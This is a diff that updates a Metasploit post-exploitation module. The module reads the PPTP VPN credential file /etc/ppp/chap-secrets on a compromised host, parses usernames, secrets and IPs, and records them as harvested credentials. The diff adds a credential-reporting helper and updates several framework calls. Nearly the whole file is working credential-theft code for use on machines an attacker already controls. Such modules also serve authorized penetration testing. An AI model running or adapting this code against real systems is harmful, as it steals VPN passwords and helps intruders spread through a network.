@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
@@ -26,7 +23,7 @@ class Metasploit3 < Msf::Post
     register_options(
       [
         OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])
-      ], self.class)
+      ])
   end
 
 
@@ -36,7 +33,7 @@ class Metasploit3 < Msf::Post
   def load_file(fname)
     begin
       data = cmd_exec("cat #{fname}")
-    rescue RequestError => e
+    rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Failed to retrieve file. #{e.message}")
       data = ''
     end
@@ -53,11 +50,39 @@ class Metasploit3 < Msf::Post
   end
 
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: fullname,
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+
   #
   # Extracts client, server, secret, and IP addresses
   #
   def extract_secrets(data)
-    tbl = Rex::Ui::Text::Table.new({
+    tbl = Rex::Text::Table.new({
       'Header'  => 'PPTPd chap-secrets',
       'Indent'  => 1,
       'Columns' => ['Client', 'Server', 'Secret', 'IP']
@@ -77,15 +102,14 @@ class Metasploit3 < Msf::Post
       secret = (found[2] || '').strip
       ip     = (found[3,found.length] * ", " || '').strip
 
-      report_auth_info({
-        :host   => session.session_host,
-        :port   => 1723, #PPTP port
-        :sname  => 'pptp',
-        :user   => client,
-        :pass   => secret,
-        :type   => 'password',
-        :active => true
-      })
+      report_cred(
+        ip: session.session_host,
+        port: 1723, # PPTP port
+        service_name: 'pptp',
+        user: client,
+        password: secret,
+
+      )
 
       tbl << [client, server, secret, ip]
     end
@@ -122,5 +146,4 @@ class Metasploit3 < Msf::Post
       extract_secrets(f)
     end
   end
-
 end
